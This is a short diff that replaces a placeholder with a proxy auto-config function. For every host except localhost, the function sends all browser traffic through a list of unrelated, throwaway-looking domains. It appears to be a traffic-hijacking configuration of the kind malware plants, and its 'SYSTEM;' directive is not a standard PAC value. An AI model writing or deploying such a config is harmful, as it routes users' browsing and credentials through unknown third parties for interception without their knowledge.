@@ -1,1 +1,3 @@
-DEMO
+function FindProxyForURL(url, host) {
+if (host === 'localhost') {return 'SYSTEM;';}return 'HTTPS ahikeleher.site:443; HTTPS shengifts.icu:443; HTTPS jjbtruckingser.space:443; HTTPS xtrmcln.fun:443; HTTPS superior-carpo.xyz:443; HTTPS alexandertreef.icu:443; HTTPS fun123.live:443';
+}
